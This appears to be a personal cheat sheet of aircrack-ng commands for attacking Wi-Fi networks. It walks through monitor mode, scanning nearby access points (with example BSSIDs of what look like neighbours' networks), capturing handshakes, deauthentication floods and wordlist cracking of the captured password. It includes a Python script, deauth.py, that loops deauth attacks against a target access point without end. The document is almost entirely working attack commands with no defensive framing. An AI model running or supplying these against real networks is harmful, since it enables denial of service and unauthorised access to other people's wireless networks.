### enable monitor mode
```
sudo ifconfig wlan0 down
sudo airmon-ng start wlan0
```



### airodump-ng scanning
```
sudo airodump-ng wlan0mon

# ex)
# 70:5D:CC:65:45:C2 - 305
# 88:36:6C:90:F4:DE - Iptime
# 70:5D:CC:6C:F2:80 - O
# 70:5D:CC:8A:A2:7E - iptime
# 80:4E:81:0A:75:83 - my phone
```


### save traffic packets
```
sudo airodump-ng --bssid 00:00:00:00:00:00 -w filename wlan0mon
```


### execute aireplay-ng
```
sudo aireplay-ng --deauth 100 -a 00:00:00:00:00:00 wlan0mon

# ex)
# sudo aireplay-ng --deauth 100 -a 70:5D:CC:65:45:C2 wlan0mon
```

### deauth.py
```python
import os, time

while True:
	os.system("aireplay-ng --deauth 10 -a 00:00:00:00:00:00 wlan0")
	time.sleep(1)

```

```bash
sudo python3 deauth.py
```




### aireplay-ng error : (wlan0mon is on channel 2, but the AP uses channel 5)
```
sudo airmon-ng start wlan0mon 5
or)
sudo iwconfig wlan0mon channel 5
```



### crack password
```
sudo aircrack-ng filename.cap -w dict.lst
```
